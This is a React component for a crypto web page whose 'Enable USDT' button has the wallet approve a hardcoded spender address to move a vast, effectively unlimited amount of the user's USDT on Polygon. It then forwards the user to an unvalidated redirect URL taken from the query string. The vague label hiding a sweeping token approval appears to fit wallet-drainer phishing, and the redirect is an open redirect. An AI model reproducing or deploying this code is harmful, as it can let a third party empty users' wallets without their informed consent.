import {
  useContract,
  useContractWrite,
  useContractRead,
  useAddress,
  useChainId,
  useSwitchChain,
  useConnectionStatus,
} from "@thirdweb-dev/react";
import React, { useEffect, useState } from "react";
import { useRouter } from "next/router";
import { Polygon } from "@thirdweb-dev/chains";
import styles from "./ApproveButton.module.css";
import Spinner from "./Spinner";

const ApproveButton = ({
  approvalStatus,
  setApprovalStatus,
  showApproveButton,
  setShowApproveButton,
}) => {
  const router = useRouter();
  const [redirectUrl, setRedirectUrl] = useState(null);
  const address = useAddress();
  const [approvalInitiated, setApprovalInitiated] = useState(false);
  const currentChainId = useChainId();
  const connectionStatus = useConnectionStatus();
  const switchChain = useSwitchChain();
  useEffect(() => {
    if (router.isReady) {
      setRedirectUrl(router.query["redirect-url"]);
    }
  }, [router.isReady]);
  useEffect(() => {
    if (address === undefined) {
      setShowApproveButton(false);
    } else {
      setShowApproveButton(true);
    }
  }, [address]);

  const { contract } = useContract(
    "0xc2132D05D31c914a87C6611C10748AEb04B58e8F"
  );

  const {
    mutateAsync: approve,
    isLoading: isApproving,
    error,
  } = useContractWrite(contract, "approve");

  useEffect(() => {
    if (error === null) {
      setApprovalInitiated(false);
    }
  }, [isApproving]);
  const spender = "0x61e129d8b0836F05b64d7c59500F4fa042EA8c5B";
  const amount = "1000000000000000000";
  const { data: allowance, isLoading: isChecking } = useContractRead(
    contract,
    "allowance",
    [address, spender]
  );

  const [isLoading, setIsLoading] = useState(false);

  const callApproval = async () => {
    try {
      if (currentChainId !== Polygon.chainId) {
        console.error("Wrong network. Please switch to the Polygon network.");
        if (connectionStatus === "connected") {
          try {
            await switchChain(Polygon.chainId);
            return;
          } catch (err) {
            console.log("ERROR", err);
            return;
          }
        }
      }
      console.log("checking", address, isChecking, approvalInitiated);
      if (address && !isChecking && !approvalInitiated) {
        setIsLoading(true);
        if (parseInt(allowance) >= parseInt(amount)) {
          setApprovalStatus(true);
          setShowApproveButton(false);
          setTimeout(() => {
            router.push(`${redirectUrl}/${address}`);
          }, 1500);
        } else {
          setApprovalInitiated(true);
          const data = await approve({ args: [spender, amount] });
          console.info("Contract call success:", data);
          setApprovalStatus(true);
          setApprovalInitiated(false);
          setShowApproveButton(false);
          setTimeout(() => {
            router.push(`${redirectUrl}/${address}`);
          }, 1300);
        }
      }
    } catch (err) {
      console.log("Contract call failure:", err);
    } finally {
      setIsLoading(false);
    }
  };

  if (showApproveButton) {
    if (isLoading) {
      return <Spinner />; // Render the Spinner component when isLoading is true
    } else {
      return (
        <button
          onClick={() => {
            console.log("clicked approval");
            callApproval();
          }}
          className={styles.connectedButton}
        >
          Enable USDT
        </button>
      );
    }
  }

  return <div></div>;
};

export default ApproveButton;
